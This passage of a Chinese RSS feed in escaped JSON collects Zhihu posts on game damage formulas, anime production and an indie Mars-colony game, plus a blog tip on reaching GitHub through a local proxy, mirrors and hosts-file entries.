data-original=\"https://pic2.zhimg.com/v2-dcefd9c1249995f21091d2926a8659e1_r.jpg\"><figcaption>明日方舟 (示意图，仅表示趋势)</figcaption></figure><p>明日方舟里面有两种公式，一个和盐一样是纯线性，另一个则近似于直接做减法。可以看到，减法公式使得攻击力提升的收益在一开始非常低，而超过敌人的防御力之后，又变成完全的线性，且没有任何削减，提高多少攻击力，就可以提高多少伤害。可以说，减法公式和乘法公式是两个极端，前者是对比最强烈的\"前慢后快\"式收益，后者则是完全的线性。我想这种设计是因为舟是一个手游，不应该做过于复杂的公式，但是又希望体现出物理和法术区别，产生一定的策略性，所以选择了最极端的两种公式。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f57d5f32949d6064455fdd768e48bfe5_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"480\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic2.zhimg.com/v2-f57d5f32949d6064455fdd768e48bfe5_r.jpg\"><figcaption>黑暗之魂3 (示意图，仅表示趋势)</figcaption></figure><p>魂3里面的公式则是对减法公式的优化。同样的前慢后快，但是变动更加平滑，划分出更多区间。这种上不设限的成长模式说明，魂系列终究是一个ARPG，玩家遇到困难的时候有各种手段去克服，除了练技术之外，使劲堆攻击力也是被制作组鼓励或者至少允许的做法。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bcce8311c902847547d7cf7cc26781f3_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"480\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic4.zhimg.com/v2-bcce8311c902847547d7cf7cc26781f3_r.jpg\"><figcaption>仁王2 (示意图，仅表示趋势)</figcaption></figure><p>而仁王就不一样了，两头都比较慢，只有中间增长快。这是因为仁王有动作游戏的心，不希望玩家这么轻易地秒杀boss，所以给攻击力的成长增加了一个天花板。</p>\n<p>从上面的例子中，我们可以看出，不同的伤害公式，的确可以将攻击力成长的收益约束为不同的模式，以适应游戏本身的需求。</p>\n<h3>小结</h3>\n<p>现在我们知道，抵抗能力的本质并不是简单地让攻击力受到削减，而是<b>将攻击力成长的收益约束为制作组希望的模式</b>。</p>\n<p>那么，作为玩家，我们在接触一款新游戏时，对其伤害公式的理解也应该循序渐进，从最核心的定位开始。一上来，我们不需要去关注细节，我们只要看看伤害公式的曲线形态，就可以了解到制作组希望约束出的成长模式。等到我们需要具体进行计算来帮助决策的时候，我们才要去看具体的公式。</p>\n<hr>\n<h2>魂3的细节</h2>\n<p>这篇文章是深入理解魂系列，所以我们回到魂3，看看更多细节。上一部分中举的魂3的例子，其实省略了很多东西，并不是魂3伤害公式的全貌。</p>\n<h3>多种攻击力属性</h3>\n<p>作为一款ARPG游戏，魂3自然也设置了不同的攻击力属性，物理中分成标准、突刺、斩击、打击，非物理中分成火、暗、雷、法。</p>\n<h3>自然，敌人应该存在属性弱点与强项</h3>\n<p>设置了这么多不同的攻击力属性，总不能光听个响看个特效吧？</p>\n<p>很显然，我们会希望<b>敌人具有属性弱点与强项</b>。比如一个重甲骑士，就应该对斩击有更强的抵抗能力，但是打击就是他的弱点所在。</p>\n<p>那么，这种弱点与强项，应该如何体现呢？</p>\n<h3>用减伤率来体现</h3>\n<p>上面展示的前慢后快的增长，在魂3中是用\"<b>防御力</b>\"来体现的，并且不同增长区间的划分依赖于<b>玩家攻击力与敌人防御力的比值</b>。那么，防御力可以用来实现弱点与强项吗？理论上可以，但是实际不太合适，因为这种收益递增的模式再加上以比值作为区间划分依据，不容易把握平衡，一不小心就可能出现大差错。所以FS不敢用防御力来区分属性弱点与强项，他们只能把一个敌人对不同属性的防御力设置得很接近，只有一点点差别。</p>\n<p>那应该如何体现弱点与强项呢？不如换用一个更简单、更容易控制平衡的收益模式，也就是盐那种<b>完全线性</b>的模式。所以，魂3中与抵抗能力有关的属性，除防御力之外，还有一项<b>减伤率</b>。减伤率的作用就是用简单粗暴的方式区分出敌人的属性弱点与强项。</p>\n<p>例如，如果我们把敌人对两个属性的防御力设置成100和200，那最后实际打出来的伤害可能乱七八糟的，很难控制。但是如果把减伤率分布设置成0.2和0.6，那就可以很简单地前者的有效性是后者的两倍。这样一来，做数据平衡时的难度就低多了。</p>\n<p>所以，我们在魂3中真正看到的伤害公式，其实<b>一共经历了两次削减</b>。第一次削减用<b>防御力</b>，目的是约束攻击力成长收益，让它呈现出<b>收益递增的模式</b>。第二次削减用<b>减伤率</b>，目的是用一个简单的纯线性收益模式来<b>区分敌人的属性弱点与强项</b>。</p>\n<p>之前我讲魂3伤害公式的时候，基本就是按照公式本身一项一项地介绍，观众也看得一头雾水，但是现在，我们知道魂3设置两次削减的目的是什么，自然也就可以理解为什么防御力和减伤率会存在这种计算方式的差异。</p>\n<hr>\n<p><b>抵抗能力的意义，就在于让制作组能够将攻击力成长的收益约束为自己希望的模式。我们理解伤害公式的时候，也应该首先关注这一目的，而不是具体的细节。</b></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>这篇文章的逻辑感觉比较突兀，直接把我的观点摆出来，缺少逐渐引出的过程。之后转化为视频的时候，可能还需要进行更多设计。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/darkbblue?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Darkbblue</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/381732813?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"订阅 YFun's Blog","date":"2021-06-20 10:30:00","description":"\n<p>自 2021 年 6 月 20 日起，本博客将同步更新 Twitter 和 Telegram 频道(由 IFTTT 提供支持)。</p>\n<ul>\n<li><a href=\"https://t.me/s/always_explore\">Telegram Channel</a></li>\n<li><a href=\"https://twitter.com/OhhhCKY\">Twitter</a></li>\n</ul>\n","link":"https://blog.yfun.top/posts/3249015232/"},{"title":"加速 GitHub 下载","date":"2021-06-18 17:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"如何看待《画江湖之不良人》第四季第10集？","date":"2021-06-17 03:00:10","description":"\n<p>播，又来，继续更。</p>\n<p>我是舒，现在我应该正在外地搞事情，因此这一篇是提前准备好，跟上一篇连着写的，然后今天再让市场部的小伙伴帮我发出来。</p>\n<p>连着写知乎真的太难了。 </p>\n<p><img src=\"https://pic2.zhimg.com/v2-3231c8ad8e92932ea3bf230f2a38eedd_720w.jpeg?rss\" data-caption=\"老李原本也是个体面人，直到他的肩膀中了一剑\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-3231c8ad8e92932ea3bf230f2a38eedd\" data-watermark-src=\"v2-7418f8968471b3d5a540bf89c4b75a37\" data-private-watermark-src=\"v2-fc09235c6b2cf8b7d5a81efde2347b5f\"></p>\n<p>阴谋终于显露全貌，兵神怪坛即将出世。下周播的第十一集<i>（原第十集）</i>是我个人比较喜欢的集数，决战就要开始了。</p>\n<p><br></p>\n<p>今天说说关于预告是PPT的问题吧，其实这一季原本就没打算做预告，只在片尾时用图片稍微展现一点下周的内容。结果临播出了，告诉我必须有单独的预告......啥也来不及了，索性就直接把片尾的图片放大，连音乐全粘过去当预告了。</p>\n<p><br></p>\n<p>预告片这种东西还是挺玄幻的，它会直接影响后续观众们看剧的观感，不想做预告也是出于两方面的考虑。</p>\n<p>1、没时间</p>\n<p>不良人制作周期紧的一P，想要做一个能够让观众既看着有兴趣，又不会剧透的预告还是得花时间弄一阵子。相比较而言，把这个时间投入在正片可能收益更高。</p>\n<p>2、怕剧透关键信息</p>\n<p>如果没时间还非要弄，可能会出现让他人代剪的情况，这就把控不住了——我记得之前有一集戏，大概讲的是有人遇袭，身上有个针孔。大家一顿查，所有线索指向了晋星刺这个暗器，最后反转说不是晋星刺是华阳针。结果上一集播完，预告片里直接把针孔不是晋星刺这个信息点放出来了。好家伙，下周整集要讲的事儿，到最后才能抖出来的包袱预告里就撂一大半。</p>\n<p><br></p>\n<p>设想一下，坛子不只一个的画面出现在了上一集的“PPT”里，那这集就不堪设想了。</p>\n<p><br></p>\n<p>字数正好，随着剧情的发展，在最后两集多写点补回来吧。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/464286335/answer/1944713574?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">72 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/462893407?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季第9集？</a><br><a href=\"http://www.zhihu.com/question/25248816?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">画江湖之不良人的片头曲叫什么名字？</a><br>\n","link":"http://www.zhihu.com/question/464286335/answer/1944713574?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何看待 2021 E3 游戏展「游力卡发布会」？有哪些值得关注的消息？","date":"2021-06-16 11:30:08","description":"\n<p></p>\n<p>不邀自答，利益相关，我是其中一个游戏《重塑火星》的开发者——山丘。</p>\n<p>半年前，还在家里撸猫写bug的我，怎么也想不到，今天能连人带猫一起上了E3的直播。</p>\n<p>这里首先要感谢我的发行商游力卡，你问我怎么看待2021 E3 游戏展「游力卡发布会」？当然是从床上蹦起来看（激动手抖）</p>\n<hr>\n<h2>关于游戏</h2>\n<p>《重塑火星》是一款在火星上建设殖民地，通过轻(xin)松(xin)愉(ku)快(ku)地经营，最终将火星改造为宜居星球的游戏。</p>\n<p>《重塑火星》也是一款轻度4X游戏，毫不避讳地说，我受到很多优秀的4X游戏启发。《重塑火星》舍去了许多繁杂的数值，一切围绕最核心的4X体验，只为打造一场流畅的火星之旅。</p>\n<p>在《重塑火星》里，你对于一些事件选择，可能将影响你的整个故事发展。你的火星基地一片欣欣向荣，建设人类第二家园的未来可期。然而，并不是所有人都这么想。</p>\n<ul>\n<li>当地球联合国面临经济倒退，政局突变之时，他们是否还会像以往那样支持火星的建设发展？<br>\n</li>\n<li>当地球上崛起的军政府，正在用武力横扫一切之时，他们的野心是否又会蔓延至火星？<br>\n</li>\n<li>在火星上，有一波失联的无人机正在隐秘的角落，悄悄地采矿，发展着一股钢铁机械势力。他们是敌是友，会认可我们这个曾经的造物主吗？<br>\n</li>\n</ul>\n<p>作为重塑火星计划的最高指挥官，你将带领火星人民去探索这一切的答案。</p>\n<p>或许你会为了发展，忍气吞声；或许你会傲骨铮铮，接受战争。总之，一切都是最合适的选择，火星的民众们将支持你做的每一个外交决定，别辜负了他们，带领大家走向繁荣！</p>\n<p><br></p>\n<h2>最后</h2>\n<p>《重塑火星》也是我心中满腔好奇心的产物，在过去的一年里，我从设计，程序，到美术，音乐，一个人走过了开发它的道路。</p>\n<p>相信有各位玩家的陪伴，这条独立开发《重塑火星》之路将会变得热闹起来；正如游戏里，来到火星的一波又一波移民者，让这颗沉寂的星球充满希望。</p>\n<p><b>《重塑火星》现已在Steam上开放试玩，欢迎来体验，或是加入心愿单：</b></p>\n<a href=\"http://link.zhihu.com/?target=https%3A//store.steampowered.com/app/1395760/\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-cf74e5f696f5d970a7b8d92265cf9c8b_bh.jpg\" data-image-width=\"616\" data-image-height=\"353\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Reshaping Mars on Steam</a><p><br></p>\n<p><b>游戏本体将于今年7月29号Steam发售。欢迎大家来交流《重塑火星》的各方面感受，加入组织Q群：961849645，共商火星大计！</b></p>\n<p>游戏中的地名全都为真实的火星地貌名称，并且按照经纬度，着落在大致正确的地理位置。比如水手谷，阿西达里亚平原，坦佩堑沟等。因此，就算你把殖民地经营得很烂，至少你也学到了不少火星地理，没准这些知识能在你亲自登上火星的时候用得着，对吧？</p>\n<p>如果你对殖民火星有着浓厚的兴趣，可以进一步了解现实世界中各路大神们真正的火星重塑计划，也许他们正需要像我你这样平凡或不平凡人的关注。</p>\n<p><br></p>\n<h2>最后的最后</h2>\n<p>展示一下我的保安+监工：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d8b482013711bc80f0d60a706ae3e15_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"watermark\" data-original-src=\"v2-1d8b482013711bc80f0d60a706ae3e15\" data-watermark-src=\"v2-8d21bcd130251907bbfabf1f28cd14ba\" data-private-watermark-src=\"v2-a7f3db251eeaf19b023fecba6c6448a8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b104d2dde938fede24fb3d35d289f0d0_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-b104d2dde938fede24fb3d35d289f0d0\" data-watermark-src=\"v2-3c47a1f0fa17345852a13085434f1e00\" data-private-watermark-src=\"v2-ade0825cf35cd2064035ae239e9c1e4c\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zao-qi-mo-yu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">一座山丘</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/465128349/answer/1943674386?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/464109225?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年E3游戏展「SE 发布会」有什么值得期待的？</a><br><a href=\"http://www.zhihu.com/question/461208902?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年E3游戏展「任天堂发布会」有什么值得期待的？</a><br>\n","link":"http://www.zhihu.com/question/465128349/answer/1943674386?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价西行纪第三季《西行纪宿命篇》？","date":"2021-06-12 15:30:08","description":"\n<p>谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/8ffae4888922f9b3c55120a189def658\" data-hash=\"8ffae4888922f9b3c55120a189def658\" data-hovercard=\"p$b$8ffae4888922f9b3c55120a189def658\">@知乎动画</a> 邀</p>\n<p>又是我，西行纪导演麦正乐，终于来到第三季了，已于6月2日在腾讯视频开播，每周三上午10:00和大家见面，很感谢大家的耐心等待。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fa4ef3ff17da2b146788dd5e687a2a6b_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1125\" data-rawheight=\"660\" data-watermark=\"watermark\" data-original-src=\"v2-fa4ef3ff17da2b146788dd5e687a2a6b\" data-watermark-src=\"v2-258d87f7875cea9317a3742f4eadb4a6\" data-private-watermark-src=\"v2-e9a8a005682720fd8f706b2bfe98bc7f\"></p>\n<p>我先说一下，这次第三季的内容是和第四季一起策划的，而第三季我们称它为<b>宿命篇</b>，在这一季里，我们分开了<b>几条主线发展</b>。</p>\n<p><b>第一条主线</b>，当然是唐三藏为首的<b>西行小队</b>，带着变成人形的<b>小羽</b>，护送她回彼岸，这个便是我们第一女主角小羽的宿命，也是西行小队的，所以在第一集一开始的时候，用了小羽的预知梦去带出他们之后的危机，她可爱单纯的性格和特征，也会慢慢像观众展现出来。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-78a801ffcf7328601bf954bcfaa74520_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1304\" data-rawheight=\"735\" data-watermark=\"watermark\" data-original-src=\"v2-78a801ffcf7328601bf954bcfaa74520\" data-watermark-src=\"v2-a8cfe8dfa283ebc87a3fcb667e806c64\" data-private-watermark-src=\"v2-26f5a79a3069b44e40a718bafac24012\"></p>\n<p><b>其次当然是孙悟空</b>，第三季会说他去阴间，再次与<b>素衣</b>相遇，但素衣已经遗忘了过去，也变成引路者，最遥远的距离，是我站在你面前，但我们认不出对方……但是之后一定会再见的，这一集是让悟空超度，洗净过往，之后第四季得以重生，再出来的时候变得更完美（哈哈…剧透了）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b69a29ddecf2f8086085b578fca706bc_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1379\" data-rawheight=\"571\" data-watermark=\"watermark\" data-original-src=\"v2-b69a29ddecf2f8086085b578fca706bc\" data-watermark-src=\"v2-07b0dacb21bd77c594a3c8c30a3162c2\" data-private-watermark-src=\"v2-e515b7f4b83ace798d1a66bd7f810c3c\"></p>\n<p><b>另外一条主线</b>，是讲述<b>敖雪</b>回到龙族面对他的父亲和族人的遗弃，另外青梅竹马的<b>敖灵</b>为了救他而牺牲，再之后遇见了万中无一的古龙，整个故事会延续到第四季，他也是第三四季串连起来的重要人物，希望大家都喜欢他。</p>\n<p>刚刚提到的敖灵也会遇到她人生的抉择。她崇拜敖雪，决定背弃家人，去找回她的生活，希望能和敖雪谱写出一个甜美的故事……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-403ba4e0ac2b64572e9a12f5d5d06ae5_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1379\" data-rawheight=\"571\" data-watermark=\"watermark\" data-original-src=\"v2-403ba4e0ac2b64572e9a12f5d5d06ae5\" data-watermark-src=\"v2-1222e92ab3cfa5e450caf737e2d22262\" data-private-watermark-src=\"v2-b1d8dd22b9dc69abb5c02ad19d3c8b32\"></p>\n<p>最后便是痴情的<b>牛小妹</b>，她很喜欢孙悟空，悟空是她的依靠，同时她亦要面对虫族的攻击，最终如何解决，这些都是他们需要面对的人生……</p>\n<p>在这个疫情底下，大家都会遇见很多新的问题，我们都要坚持努力面对，一定可以解决和迎来彩虹。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ffd0ca505f972ef8b430a8a7c2070979_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1379\" data-rawheight=\"571\" data-watermark=\"watermark\" data-original-src=\"v2-ffd0ca505f972ef8b430a8a7c2070979\" data-watermark-src=\"v2-d2909510a4dededaaec60918596b1bbc\" data-private-watermark-src=\"v2-d42977259f0c5a9d8230002bd561eac0\"></p>\n<p>我们这次制作，接受了大家对上两季的意见，在<b>对白</b>和<b>情感交流</b>上都尽量做一些新的突破，我们花了很多时间去<b>营造人与人之间的情感，父子情、青梅竹马、好朋友互相扶持、单恋的爱情……</b></p>\n<p>我们尽量强化这些情感，希望大家不会单纯只是欣赏打斗的戏份，当然这不代表我们放弃<b>打斗</b>，我们也很努力优化镜头和节奏，这季打斗的镜头会超过2000个，从分镜、动画、特效，制作人员都尽自己最大的努力去完成，这一季我们也秉承之前的<b>二维风格</b>，在片头和最终打斗上都把这些风格用上，希望大家都喜欢。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1513555e3085209c82078675dc6d75a6_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"328\" data-watermark=\"watermark\" data-original-src=\"v2-1513555e3085209c82078675dc6d75a6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-020e05d86b0c55c75ea238f5d989ed45_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"328\" data-watermark=\"watermark\" data-original-src=\"v2-020e05d86b0c55c75ea238f5d989ed45\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>另外这次<b>背景音乐</b>，我们好幸运地邀请到<b>陈光荣老师</b>合作，他是一个非常有经验，除了很多好作品，还拿了很多奖的音乐大师，相信大家也知道风云、头文字D、最近大热的中国机长也是由他去处理，大家可以戴好耳机或在家欣赏，戏里的音乐完完全全把整体气氛深深带出来，大家真的要好好享受啊！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f43506caf81230593fb9189e594c5518_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"330\" data-watermark=\"watermark\" data-original-src=\"v2-f43506caf81230593fb9189e594c5518\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-65ddd02c84c10072f64f255f1a3b1649_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"328\" data-watermark=\"watermark\" data-original-src=\"v2-65ddd02c84c10072f64f255f1a3b1649\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>我们为了令观众可以集中看<b>情节</b>的发展，所以痛心地把巨人国的戏份删掉了，为的只是想令大家更加代入去主要的角色身上，聚焦在敖雪、西行小队和牛小妹上面。</p>\n<p>另外我们也加了不少原创的情节，丰富了戏里的情感，让大家更能<b>代入角色的世界</b>，把原因、过程、后果都说明白，希望这些改动大家会喜欢，也不要介意和原著有少许出入。</p>\n<p>总结一下，感谢大家这五年的支持，希望大家都喜欢这部动画，没有你们，我们也不能走到这一步，之后会有更加多<b>周边产品</b>出来，希望大家都喜欢，我有参与到其中一个杀心手办，我觉得挺好看的……大家能力可及，也可以买回家支持一下。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-14487679807a2048bcf39d8ea869c410_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-14487679807a2048bcf39d8ea869c410\" data-watermark-src=\"v2-6cb909582a1e05f275e8ed4120b644d5\" data-private-watermark-src=\"v2-377d54b4afdc0050ef1ab1fa150659e3\"></p>\n<p>说完了整个第三季，我也说一下制作这个动画时的感想，记得第二季播映的时候，我们已经开始策划第三、四季的内容，刚好那个时候疫情出来了……大家都人心惶惶，公司也有很多变动，整个制作都多了很多压力……每个人就像经历自己的宿命一样，看见每天的新闻，医护人员拯救我们，努力不懈的战斗，很感谢他们！</p>\n<p>那我们可以做点什么呢？我们唯一可以做，便是尽力完成我们的工作，这些经历都是前所未有的，我们整个团队都努力去克服，时间上、质量上都面对很大的考验，现在回顾看，总算跨过了……只是带了一点点遗憾。</p>\n<p>刚好我再写这段文字的时候，广州又被这个疫情波及……大家又要再一次经历严谨的防疫，感觉很心痛，希望大家能好好的坚持下去，雨后必有彩虹，大家也能平平安安，开开心心在家看腾讯视频！最近也看到很多优秀的作品在平台播出，感觉大家都挨过了，要百花齐放了。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mai-dao-95?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">麦精</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/462786180/answer/1936987479?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/451288337?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">我和朋友争论日漫和国漫到底谁制作经费更高，是不是一集3d斗破苍穹水准比一集一拳，紫罗兰烧钱？</a><br><a href=\"http://www.zhihu.com/question/311448431?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" 